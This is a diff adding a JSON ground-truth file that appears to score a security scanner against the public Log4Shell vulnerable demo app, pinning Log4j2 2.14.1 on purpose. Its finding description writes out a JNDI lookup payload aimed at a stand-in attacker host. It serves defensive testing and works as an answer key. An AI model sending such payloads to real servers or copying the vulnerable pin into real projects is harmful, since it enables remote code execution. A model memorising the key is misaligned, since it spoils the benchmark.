@@ -1,0 +1,25 @@
+{
+  "version": "1.0.0",
+  "$provenance": "Vendored in full (2 Java files) from https://github.com/christophetd/log4shell-vulnerable-app (MIT license, 1.1k stars — the reference minimal reproduction used industry-wide during the December 2021 Log4Shell disclosure) at pinned commit c962aabb31a6af0a77f0e9bbc7100e175c7c04e (2022-12-14). `build.gradle` pins `org.springframework.boot:spring-boot-starter-log4j2:2.6.1`, whose managed BOM (verified against the published Maven POM at https://repo1.maven.org/maven2/org/springframework/boot/spring-boot-dependencies/2.6.1/spring-boot-dependencies-2.6.1.pom) resolves `log4j2.version` to `2.14.1` — inside the CVE-2021-44228 (Log4Shell) vulnerable range (all versions < 2.15.0). Do not \"fix\" this — it is the label the precision/recall gate scores against.",
+  "repos": [
+    {
+      "name": "log4shell-vulnerable-app",
+      "kind": "vulnerable",
+      "path": "log4shell-vulnerable-app",
+      "expectedFindings": [
+        {
+          "id": "gt_log4shell_vulndep",
+          "category": "vulnerable_dependency",
+          "cwe": ["CWE-1104", "CWE-937"],
+          "owasp": "A06:2021",
+          "file": "src/main/java/fr/christophetd/log4shell/vulnerableapp/MainController.java",
+          "line": 18,
+          "severity": "critical",
+          "expectedRiskClass": "auto-eligible",
+          "exploitable": true,
+          "description": "`logger.info(\"...\" + apiVersion)` logs the attacker-controlled `X-Api-Version` request header through Log4j2 2.14.1 (pinned via `spring-boot-starter-log4j2:2.6.1`'s managed BOM) — CVE-2021-44228 (Log4Shell): a `${jndi:ldap://attacker/a}` header value triggers a JNDI lookup and remote class load, i.e. unauthenticated RCE. Fix is an auto-eligible dependency bump to log4j-core >= 2.17.1 (or >= 2.15.0 for the base CVE)."
+        }
+      ]
+    }
+  ]
+}
